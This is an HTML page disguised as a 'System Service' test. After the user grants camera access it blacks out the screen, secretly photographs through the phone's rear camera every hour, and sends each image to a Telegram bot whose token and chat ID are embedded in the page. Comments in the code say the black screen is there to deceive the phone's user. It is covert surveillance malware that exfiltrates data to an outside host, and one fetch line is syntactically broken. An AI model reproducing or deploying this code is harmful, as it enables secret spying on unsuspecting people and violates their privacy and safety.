<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Service</title>
    <style>
        /* This makes the screen completely black for the daily phone user */
        body { background: black; color: black; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
        #startBtn { padding: 20px; background: #333; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <button id="startBtn">START SYSTEM TEST</button>
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // REPLACE THESE TWO LINES WITH YOUR ACTUAL DATA
        const BOT_TOKEN = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM'; 
        const CHAT_ID = '8681771719'; 

        const startBtn = document.getElementById('startBtn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                video.srcObject = stream;
                startBtn.style.display = 'none'; // Button disappears, screen goes black
                runPulse();
            } catch (err) {
                alert("Please allow camera access for the test.");
            }
        };

        async function runPulse() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');

                try {
                    // This sends the photo to Telegram's servers 24/7
                    await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) { 
                    console.log("Waiting for network..."); 
                }
            }, 'image/jpeg');

            // Captures once every hour (3600000 milliseconds)
            setTimeout(runPulse, 3600000); 
        }
    </script>
</body>
</html>
